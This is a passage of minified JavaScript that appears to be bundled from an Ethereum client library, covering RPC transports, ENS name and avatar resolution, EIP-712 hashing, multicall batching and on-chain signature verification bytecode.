0:a.get("Retry-After");if(s!=null&&s.match(/\d/))return parseInt(s)*1e3}return~~(1<<o)*e},retryCount:n,shouldRetry:({error:o})=>!Wh(o)})}function Sc({key:t,name:e,request:n,retryCount:r=3,retryDelay:o=150,timeout:i,type:a},s){return{config:{key:t,name:e,request:n,retryCount:r,retryDelay:o,timeout:i,type:a},request:Pw(n,{retryCount:r,retryDelay:o}),value:s}}function Ac(t,e={}){const{key:n="custom",name:r="Custom Provider",retryDelay:o}=e;return({retryCount:i})=>Sc({key:n,name:r,request:t.request.bind(t),retryCount:e.retryCount??i,retryDelay:o,type:"custom"})}function Rf(t,e={}){const{key:n="fallback",name:r="Fallback",rank:o=!1,retryCount:i,retryDelay:a}=e;return({chain:s,pollingInterval:c=4e3,timeout:l})=>{let u=t,p=()=>{};const m=Sc({key:n,name:r,async request({method:g,params:w}){const v=async(E=0)=>{const I=u[E]({chain:s,retryCount:0,timeout:l});try{const b=await I.request({method:g,params:w});return p({method:g,params:w,response:b,transport:I,status:"success"}),b}catch(b){if(p({error:b,method:g,params:w,transport:I,status:"error"}),Wh(b)||E===u.length-1)throw b;return v(E+1)}};return v()},retryCount:i,retryDelay:a,type:"fallback"},{onResponse:g=>p=g,transports:u.map(g=>g({chain:s,retryCount:0}))});if(o){const g=typeof o=="object"?o:{};Dw({chain:s,interval:g.interval??c,onTransports:w=>u=w,sampleCount:g.sampleCount,timeout:g.timeout,transports:u,weights:g.weights})}return m}}function Dw({chain:t,interval:e=4e3,onTransports:n,sampleCount:r=10,timeout:o=1e3,transports:i,weights:a={}}){const{stability:s=.7,latency:c=.3}=a,l=[],u=async()=>{const p=await Promise.all(i.map(async w=>{const v=w({chain:t,retryCount:0,timeout:o}),E=Date.now();let I,b;try{await v.request({method:"net_listening"}),b=1}catch{b=0}finally{I=Date.now()}return{latency:I-E,success:b}}));l.push(p),l.length>r&&l.shift();const m=Math.max(...l.map(w=>Math.max(...w.map(({latency:v})=>v)))),g=i.map((w,v)=>{const E=l.map(C=>C[v].latency),b=1-E.reduce((C,A)=>C+A,0)/E.length/m,_=l.map(C=>C[v].success),x=_.reduce((C,A)=>C+A,0)/_.length;return x===0?[0,v]:[c*b+s*x,v]}).sort((w,v)=>v[0]-w[0]);n(g.map(([,w])=>i[w])),await Ts(e),u()};u()}class zh extends G{constructor(){super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.",{docsPath:"/docs/clients/intro"})}}function Rw(){if(typeof WebSocket<"u")return WebSocket;if(typeof global.WebSocket<"u")return global.WebSocket;if(typeof window.WebSocket<"u")return window.WebSocket;if(typeof self.WebSocket<"u")return self.WebSocket;throw new Error("`WebSocket` is not supported in this environment")}const Nf=Rw();function Hh(t,{errorInstance:e=new Error("timed out"),timeout:n,signal:r}){return new Promise((o,i)=>{(async()=>{let a;try{const s=new AbortController;n>0&&(a=setTimeout(()=>{r?s.abort():i(e)},n)),o(await t({signal:s==null?void 0:s.signal}))}catch(s){s.name==="AbortError"&&i(e),i(s)}finally{clearTimeout(a)}})()})}let cu=0;async function Nw(t,{body:e,fetchOptions:n={},timeout:r=1e4}){var s;const{headers:o,method:i,signal:a}=n;try{const c=await Hh(async({signal:u})=>await fetch(t,{...n,body:Array.isArray(e)?Et(e.map(m=>({jsonrpc:"2.0",id:m.id??cu++,...m}))):Et({jsonrpc:"2.0",id:e.id??cu++,...e}),headers:{...o,"Content-Type":"application/json"},method:i||"POST",signal:a||(r>0?u:void 0)}),{errorInstance:new ru({body:e,url:t}),timeout:r,signal:!0});let l;if((s=c.headers.get("Content-Type"))!=null&&s.startsWith("application/json")?l=await c.json():l=await c.text(),!c.ok)throw new To({body:e,details:Et(l.error)||c.statusText,headers:c.headers,status:c.status,url:t});return l}catch(c){throw c instanceof To||c instanceof ru?c:new To({body:e,details:c.message,url:t})}}const hl=new Map;async function pl(t){let e=hl.get(t);if(e)return e;const{schedule:n}=gd({id:t,fn:async()=>{const i=new Nf(t),a=new Map,s=new Map,c=({data:u})=>{const p=JSON.parse(u),m=p.method==="eth_subscription",g=m?p.params.subscription:p.id,w=m?s:a,v=w.get(g);v&&v({data:u}),m||w.delete(g)},l=()=>{hl.delete(t),i.removeEventListener("close",l),i.removeEventListener("message",c)};return i.addEventListener("close",l),i.addEventListener("message",c),i.readyState===Nf.CONNECTING&&await new Promise((u,p)=>{i&&(i.onopen=u,i.onerror=p)}),e=Object.assign(i,{requests:a,subscriptions:s}),hl.set(t,e),[e]}}),[r,[o]]=await n();return o}function kw(t,{body:e,onResponse:n}){if(t.readyState===t.CLOSED||t.readyState===t.CLOSING)throw new Jg({body:e,url:t.url,details:"Socket is closed."});const r=cu++,o=({data:i})=>{var s;const a=JSON.parse(i);typeof a.id=="number"&&r!==a.id||(n==null||n(a),e.method==="eth_subscribe"&&typeof a.result=="string"&&t.subscriptions.set(a.result,o),e.method==="eth_unsubscribe"&&t.subscriptions.delete((s=e.params)==null?void 0:s[0]))};return t.requests.set(r,o),t.send(JSON.stringify({jsonrpc:"2.0",...e,id:r})),t}async function Mw(t,{body:e,timeout:n=1e4}){return Hh(()=>new Promise(r=>$i.webSocket(t,{body:e,onResponse:r})),{errorInstance:new ru({body:e,url:t.url}),timeout:n})}const $i={http:Nw,webSocket:kw,webSocketAsync:Mw};function Uw(t,e={}){const{batch:n,fetchOptions:r,key:o="http",name:i="HTTP JSON-RPC",retryDelay:a}=e;return({chain:s,retryCount:c,timeout:l})=>{const{batchSize:u=1e3,wait:p=0}=typeof n=="object"?n:{},m=e.retryCount??c,g=l??e.timeout??1e4,w=t||(s==null?void 0:s.rpcUrls.default.http[0]);if(!w)throw new zh;return Sc({key:o,name:i,async request({method:v,params:E}){const I={method:v,params:E},{schedule:b}=gd({id:`${t}`,wait:p,shouldSplitBatch(A){return A.length>u},fn:A=>$i.http(w,{body:A,fetchOptions:r,timeout:g}),sort:(A,f)=>A.id-f.id}),_=async A=>n?b(A):[await $i.http(w,{body:A,fetchOptions:r,timeout:g})],[{error:x,result:C}]=await _(I);if(x)throw new ld({body:I,error:x,url:w});return C},retryCount:m,retryDelay:a,timeout:g,type:"http"},{fetchOptions:r,url:t})}}function yd(t,e){var r,o,i;if(!(t instanceof G))return!1;const n=t.walk(a=>a instanceof nu);return n instanceof nu?!!(((r=n.data)==null?void 0:r.errorName)==="ResolverNotFound"||((o=n.data)==null?void 0:o.errorName)==="ResolverWildcardNotSupported"||(i=n.reason)!=null&&i.includes("Wildcard on non-extended resolvers is not supported")||e==="reverse"&&n.reason===$h[50]):!1}function Vh(t){if(t.length!==66||t.indexOf("[")!==0||t.indexOf("]")!==65)return null;const e=`0x${t.slice(1,65)}`;return _n(e)?e:null}function ms(t){let e=new Uint8Array(32).fill(0);if(!t)return No(e);const n=t.split(".");for(let r=n.length-1;r>=0;r-=1){const o=Vh(n[r]),i=o?lr(o):xt(Ln(n[r]),"bytes");e=xt(Fn([e,i]),"bytes")}return No(e)}function Bw(t){return`[${t.slice(2)}]`}function Lw(t){const e=new Uint8Array(32).fill(0);return t?Vh(t)||xt(Ln(t)):No(e)}function Tc(t){const e=t.replace(/^\.|\.$/gm,"");if(e.length===0)return new Uint8Array(1);const n=new Uint8Array(Ln(e).byteLength+2);let r=0;const o=e.split(".");for(let i=0;i<o.length;i++){let a=Ln(o[i]);a.byteLength>255&&(a=Ln(Bw(Lw(o[i])))),n[r]=a.length,n.set(a,r+1),r+=a.length+1}return n.byteLength!==r+1?n.slice(0,r+1):n}async function jw(t,{blockNumber:e,blockTag:n,coinType:r,name:o,universalResolverAddress:i}){let a=i;if(!a){if(!t.chain)throw new Error("client chain not configured. universalResolverAddress is required.");a=co({blockNumber:e,chain:t.chain,contract:"ensUniversalResolver"})}try{const s=xr({abi:Pf,functionName:"addr",...r!=null?{args:[ms(o),BigInt(r)]}:{args:[ms(o)]}}),c=await he(t,fr,"readContract")({address:a,abi:Lh,functionName:"resolve",args:[Zn(Tc(o)),s],blockNumber:e,blockTag:n});if(c[0]==="0x")return null;const l=so({abi:Pf,args:r!=null?[ms(o),BigInt(r)]:void 0,functionName:"addr",data:c[0]});return l==="0x"||jr(l)==="0x00"?null:l}catch(s){if(yd(s,"resolve"))return null;throw s}}class Fw extends G{constructor({data:e}){super("Unable to extract image from metadata. The metadata may be malformed or invalid.",{metaMessages:["- Metadata must be a JSON object with at least an `image`, `image_url` or `image_data` property.","",`Provided data: ${JSON.stringify(e)}`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"EnsAvatarInvalidMetadataError"})}}class bo extends G{constructor({reason:e}){super(`ENS NFT avatar URI is invalid. ${e}`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"EnsAvatarInvalidNftUriError"})}}class vd extends G{constructor({uri:e}){super(`Unable to resolve ENS avatar URI "${e}". The URI may be malformed, invalid, or does not respond with a valid image.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"EnsAvatarUriResolutionError"})}}class Ww extends G{constructor({namespace:e}){super(`ENS NFT avatar namespace "${e}" is not supported. Must be "erc721" or "erc1155".`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"EnsAvatarUnsupportedNamespaceError"})}}const zw=/(?<protocol>https?:\/\/[^\/]*|ipfs:\/|ipns:\/|ar:\/)?(?<root>\/)?(?<subpath>ipfs\/|ipns\/)?(?<target>[\w\-.]+)(?<subtarget>\/.*)?/,Hw=/^(Qm[1-9A-HJ-NP-Za-km-z]{44,}|b[A-Za-z2-7]{58,}|B[A-Z2-7]{58,}|z[1-9A-HJ-NP-Za-km-z]{48,}|F[0-9A-F]{50,})(\/(?<target>[\w\-.]+))?(?<subtarget>\/.*)?$/,Vw=/^data:([a-zA-Z\-/+]*);base64,([^"].*)/,Zw=/^data:([a-zA-Z\-/+]*)?(;[a-zA-Z0-9].*?)?(,)/;async function Gw(t){try{const e=await fetch(t,{method:"HEAD"});if(e.status===200){const n=e.headers.get("content-type");return n==null?void 0:n.startsWith("image/")}return!1}catch(e){return typeof e=="object"&&typeof e.response<"u"||!globalThis.hasOwnProperty("Image")?!1:new Promise(n=>{const r=new Image;r.onload=()=>{n(!0)},r.onerror=()=>{n(!1)},r.src=t})}}function kf(t,e){return t?t.endsWith("/")?t.slice(0,-1):t:e}function Zh({uri:t,gatewayUrls:e}){const n=Vw.test(t);if(n)return{uri:t,isOnChain:!0,isEncoded:n};const r=kf(e==null?void 0:e.ipfs,"https://ipfs.io"),o=kf(e==null?void 0:e.arweave,"https://arweave.net"),i=t.match(zw),{protocol:a,subpath:s,target:c,subtarget:l=""}=(i==null?void 0:i.groups)||{},u=a==="ipns:/"||s==="ipns/",p=a==="ipfs:/"||s==="ipfs/"||Hw.test(t);if(t.startsWith("http")&&!u&&!p){let g=t;return e!=null&&e.arweave&&(g=t.replace(/https:\/\/arweave.net/g,e==null?void 0:e.arweave)),{uri:g,isOnChain:!1,isEncoded:!1}}if((u||p)&&c)return{uri:`${r}/${u?"ipns":"ipfs"}/${c}${l}`,isOnChain:!1,isEncoded:!1};if(a==="ar:/"&&c)return{uri:`${o}/${c}${l||""}`,isOnChain:!1,isEncoded:!1};let m=t.replace(Zw,"");if(m.startsWith("<svg")&&(m=`data:image/svg+xml;base64,${btoa(m)}`),m.startsWith("data:")||m.startsWith("{"))return{uri:m,isOnChain:!0,isEncoded:!1};throw new vd({uri:t})}function Gh(t){if(typeof t!="object"||!("image"in t)&&!("image_url"in t)&&!("image_data"in t))throw new Fw({data:t});return t.image||t.image_url||t.image_data}async function qw({gatewayUrls:t,uri:e}){try{const n=await fetch(e).then(o=>o.json());return await xd({gatewayUrls:t,uri:Gh(n)})}catch{throw new vd({uri:e})}}async function xd({gatewayUrls:t,uri:e}){const{uri:n,isOnChain:r}=Zh({uri:e,gatewayUrls:t});if(r||await Gw(n))return n;throw new vd({uri:e})}function Kw(t){let e=t;e.startsWith("did:nft:")&&(e=e.replace("did:nft:","").replace(/_/g,"/"));const[n,r,o]=e.split("/"),[i,a]=n.split(":"),[s,c]=r.split(":");if(!i||i.toLowerCase()!=="eip155")throw new bo({reason:"Only EIP-155 supported"});if(!a)throw new bo({reason:"Chain ID not found"});if(!c)throw new bo({reason:"Contract address not found"});if(!o)throw new bo({reason:"Token ID not found"});if(!s)throw new bo({reason:"ERC namespace not found"});return{chainID:parseInt(a),namespace:s.toLowerCase(),contractAddress:c,tokenID:o}}async function Yw(t,{nft:e}){if(e.namespace==="erc721")return fr(t,{address:e.contractAddress,abi:[{name:"tokenURI",type:"function",stateMutability:"view",inputs:[{name:"tokenId",type:"uint256"}],outputs:[{name:"",type:"string"}]}],functionName:"tokenURI",args:[BigInt(e.tokenID)]});if(e.namespace==="erc1155")return fr(t,{address:e.contractAddress,abi:[{name:"uri",type:"function",stateMutability:"view",inputs:[{name:"_id",type:"uint256"}],outputs:[{name:"",type:"string"}]}],functionName:"uri",args:[BigInt(e.tokenID)]});throw new Ww({namespace:e.namespace})}async function Jw(t,{gatewayUrls:e,record:n}){return/eip155:/i.test(n)?Xw(t,{gatewayUrls:e,record:n}):xd({uri:n,gatewayUrls:e})}async function Xw(t,{gatewayUrls:e,record:n}){const r=Kw(n),o=await Yw(t,{nft:r}),{uri:i,isOnChain:a,isEncoded:s}=Zh({uri:o,gatewayUrls:e});if(a&&(i.includes("data:application/json;base64,")||i.startsWith("{"))){const l=s?atob(i.replace("data:application/json;base64,","")):i,u=JSON.parse(l);return xd({uri:Gh(u),gatewayUrls:e})}let c=r.tokenID;return r.namespace==="erc1155"&&(c=c.replace("0x","").padStart(64,"0")),qw({gatewayUrls:e,uri:i.replace(/(?:0x)?{id}/,c)})}async function qh(t,{blockNumber:e,blockTag:n,name:r,key:o,universalResolverAddress:i}){let a=i;if(!a){if(!t.chain)throw new Error("client chain not configured. universalResolverAddress is required.");a=co({blockNumber:e,chain:t.chain,contract:"ensUniversalResolver"})}try{const s=await he(t,fr,"readContract")({address:a,abi:Lh,functionName:"resolve",args:[Zn(Tc(r)),xr({abi:Of,functionName:"text",args:[ms(r),o]})],blockNumber:e,blockTag:n});if(s[0]==="0x")return null;const c=so({abi:Of,functionName:"text",data:s[0]});return c===""?null:c}catch(s){if(yd(s,"resolve"))return null;throw s}}async function Qw(t,{blockNumber:e,blockTag:n,gatewayUrls:r,name:o,universalResolverAddress:i}){const a=await he(t,qh,"getEnsText")({blockNumber:e,blockTag:n,key:"avatar",name:o,universalResolverAddress:i});if(!a)return null;try{return await Jw(t,{record:a,gatewayUrls:r})}catch{return null}}async function eb(t,{address:e,blockNumber:n,blockTag:r,universalResolverAddress:o}){let i=o;if(!i){if(!t.chain)throw new Error("client chain not configured. universalResolverAddress is required.");i=co({blockNumber:n,chain:t.chain,contract:"ensUniversalResolver"})}const a=`${e.toLowerCase().substring(2)}.addr.reverse`;try{const[s,c]=await he(t,fr,"readContract")({address:i,abi:fw,functionName:"reverse",args:[Zn(Tc(a))],blockNumber:n,blockTag:r});return e.toLowerCase()!==c.toLowerCase()?null:s}catch(s){if(yd(s,"reverse"))return null;throw s}}async function tb(t,{blockNumber:e,blockTag:n,name:r,universalResolverAddress:o}){let i=o;if(!i){if(!t.chain)throw new Error("client chain not configured. universalResolverAddress is required.");i=co({blockNumber:e,chain:t.chain,contract:"ensUniversalResolver"})}const[a]=await he(t,fr,"readContract")({address:i,abi:[{inputs:[{type:"bytes"}],name:"findResolver",outputs:[{type:"address"},{type:"bytes32"}],stateMutability:"view",type:"function"}],functionName:"findResolver",args:[Zn(Tc(r))],blockNumber:e,blockTag:n});return a}async function nb(t){const e=yc(t,{method:"eth_newBlockFilter"}),n=await t.request({method:"eth_newBlockFilter"});return{id:n,request:e(n),type:"block"}}async function Kh(t,{address:e,args:n,event:r,events:o,fromBlock:i,strict:a,toBlock:s}={}){const c=o??(r?[r]:void 0),l=yc(t,{method:"eth_newFilter"});let u=[];c&&(u=[c.flatMap(m=>ka({abi:[m],eventName:m.name,args:n}))],r&&(u=u[0]));const p=await t.request({method:"eth_newFilter",params:[{address:e,fromBlock:typeof i=="bigint"?xe(i):i,toBlock:typeof s=="bigint"?xe(s):s,...u.length?{topics:u}:{}}]});return{abi:c,args:n,eventName:r?r.name:void 0,fromBlock:i,id:p,request:l(p),strict:a,toBlock:s,type:"event"}}async function Yh(t){const e=yc(t,{method:"eth_newPendingTransactionFilter"}),n=await t.request({method:"eth_newPendingTransactionFilter"});return{id:n,request:e(n),type:"transaction"}}async function rb(t,{address:e,blockNumber:n,blockTag:r="latest"}){const o=n?xe(n):void 0,i=await t.request({method:"eth_getBalance",params:[e,o||r]});return BigInt(i)}async function ib(t,{blockHash:e,blockNumber:n,blockTag:r="latest"}={}){const o=n!==void 0?xe(n):void 0;let i;return e?i=await t.request({method:"eth_getBlockTransactionCountByHash",params:[e]}):i=await t.request({method:"eth_getBlockTransactionCountByNumber",params:[o||r]}),wt(i)}async function ob(t,{address:e,blockNumber:n,blockTag:r="latest"}){const o=n!==void 0?xe(n):void 0,i=await t.request({method:"eth_getCode",params:[e,o||r]});if(i!=="0x")return i}function ab(t){var e;return{baseFeePerGas:t.baseFeePerGas.map(n=>BigInt(n)),gasUsedRatio:t.gasUsedRatio,oldestBlock:BigInt(t.oldestBlock),reward:(e=t.reward)==null?void 0:e.map(n=>n.map(r=>BigInt(r)))}}async function sb(t,{blockCount:e,blockNumber:n,blockTag:r="latest",rewardPercentiles:o}){const i=n?xe(n):void 0,a=await t.request({method:"eth_feeHistory",params:[xe(e),i||r,o]});return ab(a)}async function cb(t,{filter:e}){const n=e.strict??!1;return(await e.request({method:"eth_getFilterLogs",params:[e.id]})).map(o=>{var i;try{const{eventName:a,args:s}="abi"in e&&e.abi?Ba({abi:e.abi,data:o.data,topics:o.topics,strict:n}):{eventName:void 0,args:void 0};return on(o,{args:s,eventName:a})}catch(a){let s,c;if(a instanceof Hr||a instanceof io){if("strict"in e&&e.strict)return;s=a.abiItem.name,c=(i=a.abiItem.inputs)==null?void 0:i.some(l=>!("name"in l&&l.name))}return on(o,{args:c?[]:{},eventName:s})}}).filter(Boolean)}const lb=/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,ub=/^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/;function db({domain:t,message:e,primaryType:n,types:r}){const o=typeof t>"u"?{}:t,i={EIP712Domain:np({domain:o}),...r};tp({domain:o,message:e,primaryType:n,types:i});const a=["0x1901"];return o&&a.push(fb({domain:o,types:i})),n!=="EIP712Domain"&&a.push(Jh({data:e,primaryType:n,types:i})),xt(Fn(a))}function fb({domain:t,types:e}){return Jh({data:t,primaryType:"EIP712Domain",types:e})}function Jh({data:t,primaryType:e,types:n}){const r=Xh({data:t,primaryType:e,types:n});return xt(r)}function Xh({data:t,primaryType:e,types:n}){const r=[{type:"bytes32"}],o=[hb({primaryType:e,types:n})];for(const i of n[e]){const[a,s]=ep({types:n,name:i.name,type:i.type,value:t[i.name]});r.push(a),o.push(s)}return Ra(r,o)}function hb({primaryType:t,types:e}){const n=Zn(pb({primaryType:t,types:e}));return xt(n)}function pb({primaryType:t,types:e}){let n="";const r=Qh({primaryType:t,types:e});r.delete(t);const o=[t,...Array.from(r).sort()];for(const i of o)n+=`${i}(${e[i].map(({name:a,type:s})=>`${s} ${a}`).join(",")})`;return n}function Qh({primaryType:t,types:e},n=new Set){const r=t.match(/^\w*/u),o=r==null?void 0:r[0];if(n.has(o)||e[o]===void 0)return n;n.add(o);for(const i of e[o])Qh({primaryType:i.type,types:e},n);return n}function ep({types:t,name:e,type:n,value:r}){if(t[n]!==void 0)return[{type:"bytes32"},xt(Xh({data:r,primaryType:n,types:t}))];if(n==="bytes")return r=`0x${(r.length%2?"0":"")+r.slice(2)}`,[{type:"bytes32"},xt(r)];if(n==="string")return[{type:"bytes32"},xt(Zn(r))];if(n.lastIndexOf("]")===n.length-1){const o=n.slice(0,n.lastIndexOf("[")),i=r.map(a=>ep({name:e,type:o,types:t,value:a}));return[{type:"bytes32"},xt(Ra(i.map(([a])=>a),i.map(([,a])=>a)))]}return[{type:n},r]}function tp({domain:t,message:e,primaryType:n,types:r}){const o=r,i=(a,s)=>{for(const c of a){const{name:l,type:u}=c,p=u,m=s[l],g=p.match(ub);if(g&&(typeof m=="number"||typeof m=="bigint")){const[E,I,b]=g;xe(m,{signed:I==="int",size:parseInt(b)/8})}if(p==="address"&&typeof m=="string"&&!ur(m))throw new ko({address:m});const w=p.match(lb);if(w){const[E,I]=w;if(I&&lt(m)!==parseInt(I))throw new Zm({expectedSize:parseInt(I),givenSize:lt(m)})}const v=o[p];v&&i(v,m)}};if(o.EIP712Domain&&t&&i(o.EIP712Domain,t),n!=="EIP712Domain"){const a=o[n];i(a,e)}}function np({domain:t}){return[typeof(t==null?void 0:t.name)=="string"&&{name:"name",type:"string"},(t==null?void 0:t.version)&&{name:"version",type:"string"},typeof(t==null?void 0:t.chainId)=="number"&&{name:"chainId",type:"uint256"},(t==null?void 0:t.verifyingContract)&&{name:"verifyingContract",type:"address"},(t==null?void 0:t.salt)&&{name:"salt",type:"bytes32"}].filter(Boolean)}const ml="/docs/contract/encodeDeployData";function rp({abi:t,args:e,bytecode:n}){if(!e||e.length===0)return n;const r=t.find(i=>"type"in i&&i.type==="constructor");if(!r)throw new Bm({docsPath:ml});if(!("inputs"in r))throw new vf({docsPath:ml});if(!r.inputs||r.inputs.length===0)throw new vf({docsPath:ml});const o=Ra(r.inputs,e);return Xu([n,o])}const mb=`Ethereum Signed Message:
`;function gb(t,e){const n=typeof t=="string"?Ln(t):t.raw instanceof Uint8Array?t.raw:lr(t.raw),r=Ln(`${mb}${n.length}`);return xt(Fn([r,n]),e)}function wb(t){return t.map(e=>({...e,value:BigInt(e.value)}))}function bb(t){return{...t,balance:t.balance?BigInt(t.balance):void 0,nonce:t.nonce?wt(t.nonce):void 0,storageProof:t.storageProof?wb(t.storageProof):void 0}}async function yb(t,{address:e,blockNumber:n,blockTag:r,storageKeys:o}){const i=r??"latest",a=n!==void 0?xe(n):void 0,s=await t.request({method:"eth_getProof",params:[e,o,a||i]});return bb(s)}async function vb(t,{address:e,blockNumber:n,blockTag:r="latest",slot:o}){const i=n!==void 0?xe(n):void 0;return await t.request({method:"eth_getStorageAt",params:[e,o,i||r]})}async function _d(t,{blockHash:e,blockNumber:n,blockTag:r,hash:o,index:i}){var u,p,m;const a=r||"latest",s=n!==void 0?xe(n):void 0;let c=null;if(o?c=await t.request({method:"eth_getTransactionByHash",params:[o]}):e?c=await t.request({method:"eth_getTransactionByBlockHashAndIndex",params:[e,xe(i)]}):(s||a)&&(c=await t.request({method:"eth_getTransactionByBlockNumberAndIndex",params:[s||a,xe(i)]})),!c)throw new Ph({blockHash:e,blockNumber:n,blockTag:a,hash:o,index:i});return(((m=(p=(u=t.chain)==null?void 0:u.formatters)==null?void 0:p.transaction)==null?void 0:m.format)||mh)(c)}async function xb(t,{hash:e,transactionReceipt:n}){const[r,o]=await Promise.all([he(t,ja,"getBlockNumber")({}),e?he(t,_d,"getBlockNumber")({hash:e}):void 0]),i=(n==null?void 0:n.blockNumber)||(o==null?void 0:o.blockNumber);return i?r-i+1n:0n}async function lu(t,{hash:e}){var o,i,a;const n=await t.request({method:"eth_getTransactionReceipt",params:[e]});if(!n)throw new Dh({hash:e});return(((a=(i=(o=t.chain)==null?void 0:o.formatters)==null?void 0:i.transactionReceipt)==null?void 0:a.format)||Am)(n)}async function _b(t,e){var v;const{allowFailure:n=!0,batchSize:r,blockNumber:o,blockTag:i,contracts:a,multicallAddress:s}=e,c=r??(typeof((v=t.batch)==null?void 0:v.multicall)=="object"&&t.batch.multicall.batchSize||1024);let l=s;if(!l){if(!t.chain)throw new Error("client chain not configured. multicallAddress is required.");l=co({blockNumber:o,chain:t.chain,contract:"multicall3"})}const u=[[]];let p=0,m=0;for(let E=0;E<a.length;E++){const{abi:I,address:b,args:_,functionName:x}=a[E];try{const C=xr({abi:I,args:_,functionName:x});m+=(C.length-2)/2,c>0&&m>c&&u[p].length>0&&(p++,m=(C.length-2)/2,u[p]=[]),u[p]=[...u[p],{allowFailure:!0,callData:C,target:b}]}catch(C){const A=Ko(C,{abi:I,address:b,args:_,docsPath:"/docs/contract/multicall",functionName:x});if(!n)throw A;u[p]=[...u[p],{allowFailure:!0,callData:"0x",target:b}]}}const g=await Promise.allSettled(u.map(E=>he(t,fr,"readContract")({abi:ou,address:l,args:[E],blockNumber:o,blockTag:i,functionName:"aggregate3"}))),w=[];for(let E=0;E<g.length;E++){const I=g[E];if(I.status==="rejected"){if(!n)throw I.reason;for(let _=0;_<u[E].length;_++)w.push({status:"failure",error:I.reason,result:void 0});continue}const b=I.value;for(let _=0;_<b.length;_++){const{returnData:x,success:C}=b[_],{callData:A}=u[E][_],{abi:f,address:T,functionName:R,args:N}=a[w.length];try{if(A==="0x")throw new wc;if(!C)throw new cd({data:x});const k=so({abi:f,args:N,data:x,functionName:R});w.push(n?{result:k,status:"success"}:k)}catch(k){const Y=Ko(k,{abi:f,address:T,args:N,docsPath:"/docs/contract/multicall",functionName:R});if(!n)throw Y;w.push({error:Y,result:void 0,status:"failure"})}}}if(w.length!==a.length)throw new G("multicall results mismatch");return w}const Eb="0x60806040523480156200001157600080fd5b50604051620007003803806200070083398101604081905262000034916200056f565b6000620000438484846200004f565b9050806000526001601ff35b600080846001600160a01b0316803b806020016040519081016040528181526000908060200190933c90507f6492649264926492649264926492649264926492649264926492649264926492620000a68462000451565b036200021f57600060608085806020019051810190620000c79190620005ce565b8651929550909350915060000362000192576000836001600160a01b031683604051620000f5919062000643565b6000604051808303816000865af19150503d806000811462000134576040519150601f19603f3d011682016040523d82523d6000602084013e62000139565b606091505b5050905080620001905760405162461bcd60e51b815260206004820152601e60248201527f5369676e617475726556616c696461746f723a206465706c6f796d656e74000060448201526064015b60405180910390fd5b505b604051630b135d3f60e11b808252906001600160a01b038a1690631626ba7e90620001c4908b90869060040162000661565b602060405180830381865afa158015620001e2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200020891906200069d565b6001600160e01b031916149450505050506200044a565b805115620002b157604051630b135d3f60e11b808252906001600160a01b03871690631626ba7e9062000259908890889060040162000661565b602060405180830381865afa15801562000277573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200029d91906200069d565b6001600160e01b031916149150506200044a565b8251604114620003195760405162461bcd60e51b815260206004820152603a6024820152600080516020620006e083398151915260448201527f3a20696e76616c6964207369676e6174757265206c656e677468000000000000606482015260840162000187565b620003236200046b565b506020830151604080850151855186939260009185919081106200034b576200034b620006c9565b016020015160f81c9050601b81148015906200036b57508060ff16601c14155b15620003cf5760405162461bcd60e51b815260206004820152603b6024820152600080516020620006e083398151915260448201527f3a20696e76616c6964207369676e617475726520762076616c75650000000000606482015260840162000187565b6040805160008152602081018083528a905260ff83169181019190915260608101849052608081018390526001600160a01b038a169060019060a0016020604051602081039080840390855afa1580156200042e573d6000803e3d6000fd5b505050602060405103516001600160a01b031614955050505050505b9392505050565b60006020825110156200046357600080fd5b508051015190565b60405180606001604052806003906020820280368337509192915050565b6001600160a01b03811681146200049f57600080fd5b50565b634e487b7160e01b600052604160045260246000fd5b60005b83811015620004d5578181015183820152602001620004bb565b50506000910152565b600082601f830112620004f057600080fd5b81516001600160401b03808211156200050d576200050d620004a2565b604051601f8301601f19908116603f01168101908282118183101715620005385762000538620004a2565b816040528381528660208588010111156200055257600080fd5b62000565846020830160208901620004b8565b9695505050505050565b6000806000606084860312156200058557600080fd5b8351620005928162000489565b6020850151604086015191945092506001600160401b03811115620005b657600080fd5b620005c486828701620004de565b9150509250925092565b600080600060608486031215620005e457600080fd5b8351620005f18162000489565b60208501519093506001600160401b03808211156200060f57600080fd5b6200061d87838801620004de565b935060408601519150808211156200063457600080fd5b50620005c486828701620004de565b6000825162000657818460208701620004b8565b9190910192915050565b828152604060208201526000825180604084015262000688816060850160208701620004b8565b601f01601f1916919091016060019392505050565b600060208284031215620006b057600080fd5b81516001600160e01b0319811681146200044a57600080fd5b634e487b7160e01b600052603260045260246000fdfe5369676e617475726556616c696461746f72237265636f7665725369676e6572";/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */BigInt(0);BigInt(1);BigInt(2);function Cb(t,e){if(t.length!==e.length)return!1;for(let n=0;n<t.length;n++)if(t[n]!==e[n])return!1;return!0}function Sb(t,e){const n=_n(t)?lr(t):t,r=_n(e)?lr(e):e;return Cb(n,r)}async function ip(t,{address:e,hash:n,signature:r,...o}){const i=_n(r)?r:Zn(r);try{const{data:a}=await he(t,_c,"call")({data:rp({abi:hw,args:[e,n,i],bytecode:Eb}),...o});return Sb(a??"0x0","0x1")}catch(a){if(a instanceof Rh)return!1;throw a}}async function Ab(t,{address:e,message:n,signature:r,...o}){const i=gb(n);return ip(t,{address:e,hash:i,signature:r,...o})}async function Tb(t,{address:e,signature:n,message:r,primaryType:o,types:i,domain:a,...s}){const c=db({message:r,primaryType:o,types:i,domain:a});return ip(t,{address:e,hash:c,signature:n,...s})}function op(t,{emitOnBegin:e=!1,emitMissed:n=!1,onBlockNumber:r,onError:o,poll:i,pollingInterval:a=t.pollingInterval}){const s=typeof i<"u"?i:t.transport.type!=="webSocket";let c;return s?(()=>{const p=Et(["watchBlockNumber",t.uid,e,n,a]);return lo(p,{onBlockNumber:r,onError:o},m=>La(async()=>{var g;try{const w=await he(t,ja,"getBlockNumber")({cacheTime:0});if(c){if(w===c)return;if(w-c>1&&n)for(let 